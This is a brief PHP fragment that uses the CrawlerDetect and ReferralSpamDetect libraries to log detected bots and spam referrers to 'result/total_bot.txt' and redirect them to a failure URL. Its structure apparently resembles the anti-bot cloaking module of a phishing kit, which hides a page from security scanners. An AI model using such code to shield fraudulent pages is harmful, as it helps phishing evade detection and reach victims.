<?php
require 'CrawlerDetect/Fixtures/AbstractProvider.php';
require 'CrawlerDetect/Fixtures/AbstractReff.php';
require 'CrawlerDetect/Fixtures/Crawlers.php';
require 'CrawlerDetect/Fixtures/Exclusions.php';
require 'CrawlerDetect/Fixtures/Headers.php';
require 'CrawlerDetect/Fixtures/Headerspam.php';
require 'CrawlerDetect/Fixtures/SpamReferrers.php';
require 'CrawlerDetect/CrawlerDetect.php';
require 'CrawlerDetect/ReferralSpamDetect.php';
use Jaybizzle\CrawlerDetect\CrawlerDetect;
use Jaybizzle\ReferralSpamDetect\ReferralSpamDetect;

$CrawlerDetect = new CrawlerDetect;
$referrer = new ReferralSpamDetect;
if($CrawlerDetect->isCrawler()) {
    $click = fopen("result/total_bot.txt","a");
    fwrite($click,"$ip|Bot Crawler"."\n");
    fclose($click);
    header('Location: ' . $FAILED_PAGE_URL);
    exit();

}
if($referrer->isReferralSpam()) {
	$click = fopen("result/total_bot.txt","a");
    fwrite($click,"$ip|Referrer Block"."\n");
    fclose($click);
    header('Location: ' . $FAILED_PAGE_URL);
    exit();
   
}